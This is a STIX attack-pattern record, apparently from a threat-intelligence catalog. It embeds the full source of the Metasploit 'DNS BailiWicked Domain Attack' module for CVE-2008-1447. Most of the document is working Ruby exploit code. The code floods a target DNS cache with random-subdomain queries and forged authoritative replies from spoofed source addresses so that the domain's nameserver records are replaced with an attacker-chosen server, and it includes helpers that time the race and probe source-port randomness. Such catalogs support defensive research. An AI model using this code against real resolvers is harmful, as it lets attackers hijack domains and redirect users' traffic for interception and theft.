{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d6805ad8-c727-488c-9a8a-50bfa9082555",
    "created": "2024-08-14T16:32:53.76453Z",
    "modified": "2024-08-14T16:32:53.764534Z",
    "name": "DNS BailiWicked Domain Attack",
    "description": " This exploit attacks a fairly ubiquitous flaw in DNS implementations which Dan Kaminsky found and disclosed ~Jul 2008.  This exploit replaces the target domains nameserver entries in a vulnerable DNS cache server. This attack works by sending random hostname queries to the target DNS server coupled with spoofed replies to those queries from the authoritative nameservers for that domain. Eventually, a guessed ID will match, the spoofed packet will get accepted, and the nameserver entries for the target domain will be replaced by the server specified in the NEWDNS option of this exploit. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/spoof/dns/bailiwicked_domain.rb",
            "external_id": "bailiwicked_domain.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2008-1447"
        },
        {
            "source_name": "reference",
            "url": "http://www.caughq.org/exploits/CAU-EX-2008-0003.txt"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'net/dns'\nrequire 'resolv'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Capture\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'DNS BailiWicked Domain Attack',\n      'Description'    => %q{\n        This exploit attacks a fairly ubiquitous flaw in DNS implementations which\n        Dan Kaminsky found and disclosed ~Jul 2008.  This exploit replaces the target\n        domains nameserver entries in a vulnerable DNS cache server. This attack works\n        by sending random hostname queries to the target DNS server coupled with spoofed\n        replies to those queries from the authoritative nameservers for that domain.\n        Eventually, a guessed ID will match, the spoofed packet will get accepted, and\n        the nameserver entries for the target domain will be replaced by the server\n        specified in the NEWDNS option of this exploit.\n      },\n      'Author'         =>\n        [\n          'I)ruid', 'hdm',\n          # Cedric figured out the NS injection method\n          # and was cool enough to email us and share!\n          'Cedric Blancher <sid[at]rstack.org>'\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2008-1447' ],\n          [ 'OSVDB', '46776'],\n          [ 'US-CERT-VU', '800113' ],\n          [ 'URL', 'http://www.caughq.org/exploits/CAU-EX-2008-0003.txt' ],\n        ],\n      'DisclosureDate' => '2008-07-21'\n    ))\n\n    register_options(\n      [\n        OptEnum.new('SRCADDR', [true, 'The source address to use for sending the queries', 'Real', ['Real', 'Random'], 'Real']),\n        OptPort.new('SRCPORT', [true, \"The target server's source query port (0 for automatic)\", nil]),\n        OptString.new('DOMAIN', [true, 'The domain to hijack', 'example.com']),\n        OptString.new('NEWDNS', [true, 'The hostname of the replacement DNS server', nil]),\n        OptAddress.new('RECONS', [true, 'The nameserver used for reconnaissance', '208.67.222.222']),\n        OptInt.new('XIDS', [true, 'The number of XIDs to try for each query (0 for automatic)', 0]),\n        OptInt.new('TTL', [true, 'The TTL for the malicious host entry', rand(20000)+30000]),\n      ])\n\n    deregister_options('FILTER','PCAPFILE')\n  end\n\n  def auxiliary_commands\n    return {\n      \"racer\" => \"Determine the size of the window for the target server\"\n    }\n  end\n\n  def cmd_racer(*args)\n    targ = args[0] || rhost()\n    dom  = args[1] || \"example.com\"\n\n    if !(targ and targ.length > 0)\n      print_status(\"usage: racer [dns-server] [domain]\")\n      return\n    end\n\n    calculate_race(targ, dom)\n  end\n\n  def check\n    targ = rhost\n\n    srv_sock = Rex::Socket.create_udp(\n      'PeerHost' => targ,\n      'PeerPort' => 53\n    )\n\n    random = false\n    ports  = {}\n    lport  = nil\n    reps   = 0\n\n    1.upto(30) do |i|\n\n      req = Resolv::DNS::Message.new\n      txt = \"spoofprobe-check-#{i}-#{$$}#{(rand()*1000000).to_i}.red.metasploit.com\"\n      req.add_question(txt, Resolv::DNS::Resource::IN::TXT)\n      req.rd = 1\n\n      srv_sock.put(req.encode)\n      res, addr = srv_sock.recvfrom(65535, 1.0)\n\n\n      if res and res.length > 0\n        reps += 1\n        res = Resolv::DNS::Message.decode(res)\n        res.each_answer do |name, ttl, data|\n          if (name.to_s == txt and data.strings.join('') =~ /^([^\\s]+)\\s+.*red\\.metasploit\\.com/m)\n            t_addr, t_port = $1.split(':')\n\n            vprint_status(\" >> ADDRESS: #{t_addr}  PORT: #{t_port}\")\n            t_port = t_port.to_i\n            if(lport and lport != t_port)\n              random = true\n            end\n            lport  = t_port\n            ports[t_port] ||=0\n            ports[t_port]  +=1\n          end\n        end\n      end\n\n\n      if(i>5 and ports.keys.length == 0)\n        break\n      end\n    end\n\n    srv_sock.close\n\n    if(ports.keys.length == 0)\n      vprint_error(\"ERROR: This server is not replying to recursive requests\")\n      return Exploit::CheckCode::Unknown\n    end\n\n    if(reps < 30)\n      vprint_warning(\"WARNING: This server did not reply to all of our requests\")\n    end\n\n    if(random)\n      ports_u = ports.keys.length\n      ports_r = ((ports.keys.length/30.0)*100).to_i\n      vprint_status(\"PASS: This server does not use a static source port. Randomness: #{ports_u}/30 %#{ports_r}\")\n      if(ports_r != 100)\n        vprint_status(\"INFO: This server's source ports are not really random and may still be exploitable, but not by this tool.\")\n        # Not exploitable by this tool, so we lower this to Appears on purpose to lower the user's confidence\n        return Exploit::CheckCode::Appears\n      end\n    else\n      vprint_error(\"FAIL: This server uses a static source port and is vulnerable to poisoning\")\n      return Exploit::CheckCode::Vulnerable\n    end\n\n    Exploit::CheckCode::Safe\n  end\n\n  def run\n    check_pcaprub_loaded # Check first\n    target  = rhost()\n    source  = Rex::Socket.source_address(target)\n    saddr   = datastore['SRCADDR']\n    sport   = datastore['SRCPORT']\n    domain  = datastore['DOMAIN'] + '.'\n    newdns  = datastore['NEWDNS']\n    recons  = datastore['RECONS']\n    xids    = datastore['XIDS'].to_i\n    newttl  = datastore['TTL'].to_i\n    xidbase = rand(20001) + 20000\n    numxids = xids\n    address = Rex::Text.rand_text(4).unpack(\"C4\").join(\".\")\n\n    srv_sock = Rex::Socket.create_udp(\n      'PeerHost' => target,\n      'PeerPort' => 53\n    )\n\n    # Get the source port via the metasploit service if it's not set\n    if sport.to_i == 0\n      req = Resolv::DNS::Message.new\n      txt = \"spoofprobe-#{$$}#{(rand()*1000000).to_i}.red.metasploit.com\"\n      req.add_question(txt, Resolv::DNS::Resource::IN::TXT)\n      req.rd = 1\n\n      srv_sock.put(req.encode)\n      res, addr = srv_sock.recvfrom()\n\n      if res and res.length > 0\n        res = Resolv::DNS::Message.decode(res)\n        res.each_answer do |name, ttl, data|\n          if (name.to_s == txt and data.strings.join('') =~ /^([^\\s]+)\\s+.*red\\.metasploit\\.com/m)\n            t_addr, t_port = $1.split(':')\n            sport = t_port.to_i\n\n            print_status(\"Switching to target port #{sport} based on Metasploit service\")\n            if target != t_addr\n              print_status(\"Warning: target address #{target} is not the same as the nameserver's query source address #{t_addr}!\")\n            end\n          end\n        end\n      end\n    end\n\n    # Verify its not already poisoned\n    begin\n      query = Resolv::DNS::Message.new\n      query.add_question(domain, Resolv::DNS::Resource::IN::NS)\n      query.rd = 0\n\n      begin\n        cached = false\n        srv_sock.put(query.encode)\n        answer, addr = srv_sock.recvfrom()\n\n        if answer and answer.length > 0\n          answer = Resolv::DNS::Message.decode(answer)\n          answer.each_answer do |name, ttl, data|\n\n            if((name.to_s + \".\") == domain and data.name.to_s == newdns)\n              t = Time.now + ttl\n              print_error(\"Failure: This domain is already using #{newdns} as a nameserver\")\n              print_error(\"         Cache entry expires on #{t}\")\n              srv_sock.close\n              close_pcap\n              return\n            end\n          end\n\n        end\n      end until not cached\n    rescue ::Interrupt\n      raise $!\n    rescue ::Exception => e\n      print_error(\"Error checking the DNS name: #{e.class} #{e} #{e.backtrace}\")\n    end\n\n\n    res0 = Net::DNS::Resolver.new(:nameservers => [recons], :dns_search => false, :recursive => true) # reconnaissance resolver\n\n    print_status \"Targeting nameserver #{target} for injection of #{domain} nameservers as #{newdns}\"\n\n    # Look up the nameservers for the domain\n    print_status \"Querying recon nameserver for #{domain}'s nameservers...\"\n    answer0 = res0.send(domain, Net::DNS::NS)\n    #print_status \" Got answer with #{answer0.header.anCount} answers, #{answer0.header.nsCount} authorities\"\n\n    barbs = [] # storage for nameservers\n    answer0.answer.each do |rr0|\n      print_status \" Got an #{rr0.type} record: #{rr0.inspect}\"\n      if rr0.type == 'NS'\n        print_status \"  Querying recon nameserver for address of #{rr0.nsdname}...\"\n        answer1 = res0.send(rr0.nsdname) # get the ns's answer for the hostname\n        #print_status \" Got answer with #{answer1.header.anCount} answers, #{answer1.header.nsCount} authorities\"\n        answer1.answer.each do |rr1|\n          print_status \"   Got an #{rr1.type} record: #{rr1.inspect}\"\n          res2 = Net::DNS::Resolver.new(:nameservers => rr1.address, :dns_search => false, :recursive => false, :retry => 1)\n          print_status \"    Checking Authoritativeness: Querying #{rr1.address} for #{domain}...\"\n          answer2 = res2.send(domain, Net::DNS::SOA)\n          if answer2 and answer2.header.auth? and answer2.header.anCount >= 1\n            nsrec = {:name => rr0.nsdname, :addr => rr1.address}\n            barbs << nsrec\n            print_status \"    #{rr0.nsdname} is authoritative for #{domain}, adding to list of nameservers to spoof as\"\n          end\n        end\n      end\n    end\n\n    if barbs.length == 0\n      print_status( \"No DNS servers found.\")\n      srv_sock.close\n      close_pcap\n      return\n    end\n\n    if(xids == 0)\n      print_status(\"Calculating the number of spoofed replies to send per query...\")\n      qcnt = calculate_race(target, domain, 100)\n      numxids = ((qcnt * 1.5) / barbs.length).to_i\n      if(numxids == 0)\n        print_status(\"The server did not reply, giving up.\")\n        srv_sock.close\n        close_pcap\n        return\n      end\n      print_status(\"Sending #{numxids} spoofed replies from each nameserver (#{barbs.length}) for each query\")\n    end\n\n    # Flood the target with queries and spoofed responses, one will eventually hit\n    queries = 0\n    responses = 0\n\n    open_pcap unless self.capture\n\n    print_status( \"Attempting to inject poison records for #{domain}'s nameservers into #{target}:#{sport}...\")\n\n    while true\n      randhost = Rex::Text.rand_text_alphanumeric(rand(10)+10) + '.' + domain # randomize the hostname\n\n      # Send spoofed query\n      req = Resolv::DNS::Message.new\n      req.id = rand(2**16)\n      req.add_question(randhost, Resolv::DNS::Resource::IN::A)\n\n      req.rd = 1\n\n      src_ip = source\n\n      if(saddr == 'Random')\n        src_ip = Rex::Text.rand_text(4).unpack(\"C4\").join(\".\")\n      end\n\n      p = PacketFu::UDPPacket.new\n      p.ip_saddr = src_ip\n      p.ip_daddr = target\n      p.ip_ttl = 255\n      p.udp_sport = (rand((2**16)-1024)+1024).to_i\n      p.udp_dport = 53\n      p.payload = req.encode\n      p.recalc\n\n      capture_sendto(p, target)\n      queries += 1\n\n      # Send evil spoofed answer from ALL nameservers (barbs[*][:addr])\n      req.add_answer(randhost, newttl, Resolv::DNS::Resource::IN::A.new(address))\n      req.add_authority(domain, newttl, Resolv::DNS::Resource::IN::NS.new(Resolv::DNS::Name.create(newdns)))\n      req.add_additional(newdns, newttl, Resolv::DNS::Resource::IN::A.new(address)) # Ignored\n      req.qr = 1\n      req.aa = 1\n\n      # Reuse our PacketFu object\n      p.udp_sport = 53\n      p.udp_dport = sport.to_i\n\n      xidbase.upto(xidbase+numxids-1) do |id|\n        req.id = id\n        p.payload = req.encode\n        barbs.each do |barb|\n          p.ip_saddr = barb[:addr].to_s\n          p.recalc\n          capture_sendto(p, target)\n          responses += 1\n        end\n      end\n\n      # status update\n      if queries % 1000 == 0\n        print_status(\"Sent #{queries} queries and #{responses} spoofed responses...\")\n        if(xids == 0)\n          print_status(\"Recalculating the number of spoofed replies to send per query...\")\n          qcnt = calculate_race(target, domain, 25)\n          numxids = ((qcnt * 1.5) / barbs.length).to_i\n          if(numxids == 0)\n            print_status(\"The server has stopped replying, giving up.\")\n            srv_sock.close\n            close_pcap\n            return\n          end\n          print_status(\"Now sending #{numxids} spoofed replies from each nameserver (#{barbs.length}) for each query\")\n        end\n      end\n\n      # every so often, check and see if the target is poisoned...\n      if queries % 250 == 0\n        begin\n          query = Resolv::DNS::Message.new\n          query.add_question(domain, Resolv::DNS::Resource::IN::NS)\n          query.rd = 0\n\n          srv_sock.put(query.encode)\n          answer, addr = srv_sock.recvfrom()\n\n          if answer and answer.length > 0\n            answer = Resolv::DNS::Message.decode(answer)\n            answer.each_answer do |name, ttl, data|\n              if((name.to_s + \".\") == domain and data.name.to_s == newdns)\n                print_good(\"Poisoning successful after #{queries} queries and #{responses} responses: #{domain} == #{newdns}\")\n                srv_sock.close\n                close_pcap\n                return\n              end\n            end\n          end\n        rescue ::Interrupt\n          raise $!\n        rescue ::Exception => e\n          print_error(\"Error querying the DNS name: #{e.class} #{e} #{e.backtrace}\")\n        end\n      end\n\n    end\n\n  end\n\n  #\n  # Send a recursive query to the target server, then flood\n  # the server with non-recursive queries for the same entry.\n  # Calculate how many non-recursive queries we receive back\n  # until the real server responds. This should give us a\n  # ballpark figure for ns->ns latency. We can repeat this\n  # a few times to account for each nameserver the cache server\n  # may query for the target domain.\n  #\n  def calculate_race(server, domain, num=50)\n\n    q_beg_t = nil\n    q_end_t = nil\n    cnt     = 0\n\n    times   = []\n\n    hostname = Rex::Text.rand_text_alphanumeric(rand(10)+10) + '.' + domain\n\n    sock = Rex::Socket.create_udp(\n      'PeerHost' => server,\n      'PeerPort' => 53\n    )\n\n\n    req = Resolv::DNS::Message.new\n    req.add_question(hostname, Resolv::DNS::Resource::IN::A)\n    req.rd = 1\n    req.id = 1\n\n    q_beg_t = Time.now.to_f\n    sock.put(req.encode)\n    req.rd = 0\n\n    while(times.length < num)\n      res, addr = sock.recvfrom(65535, 0.01)\n\n      if res and res.length > 0\n        res = Resolv::DNS::Message.decode(res)\n\n        if(res.id == 1)\n          times << [Time.now.to_f - q_beg_t, cnt]\n          cnt = 0\n\n          hostname = Rex::Text.rand_text_alphanumeric(rand(10)+10) + '.' + domain\n\n          sock.close\n          sock = Rex::Socket.create_udp(\n            'PeerHost' => server,\n            'PeerPort' => 53\n          )\n\n          q_beg_t = Time.now.to_f\n          req = Resolv::DNS::Message.new\n          req.add_question(hostname, Resolv::DNS::Resource::IN::A)\n          req.rd = 1\n          req.id = 1\n\n          sock.put(req.encode)\n          req.rd = 0\n        end\n\n        cnt += 1\n      end\n\n      req.id += 1\n\n      sock.put(req.encode)\n    end\n\n    min_time = (times.map{|i| i[0]}.min * 100).to_i / 100.0\n    max_time = (times.map{|i| i[0]}.max * 100).to_i / 100.0\n    sum       = 0\n    times.each{|i| sum += i[0]}\n    avg_time = (\t(sum / times.length) * 100).to_i / 100.0\n\n    min_count = times.map{|i| i[1]}.min\n    max_count = times.map{|i| i[1]}.max\n    sum       = 0\n    times.each{|i| sum += i[1]}\n    avg_count = sum / times.length\n\n    sock.close\n\n    print_status(\"  race calc: #{times.length} queries | min/max/avg time: #{min_time}/#{max_time}/#{avg_time} | min/max/avg replies: #{min_count}/#{max_count}/#{avg_count}\")\n\n\n    # XXX: We should subtract the timing from the target to us (calculated based on 0.50 of our non-recursive query times)\n    avg_count\n  end\nend\n",
    "x_mitre_disclosure_date": "2008-07-21"
}